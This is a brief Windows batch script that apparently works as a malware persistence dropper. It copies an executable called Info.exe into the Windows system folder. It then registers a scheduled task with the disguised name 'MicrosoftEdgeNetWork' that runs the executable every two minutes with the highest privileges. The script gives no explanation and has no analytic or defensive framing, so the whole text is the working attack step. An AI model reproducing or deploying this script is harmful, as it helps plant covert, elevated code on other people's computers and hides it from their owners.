@echo off
xcopy "Info.exe" "C:\Windows\" /Y

schtasks /create /tn "MicrosoftEdgeNetWork" /tr "C:\Windows\Info.exe" /sc Minute /mo 2 /f /RL HIGHEST 
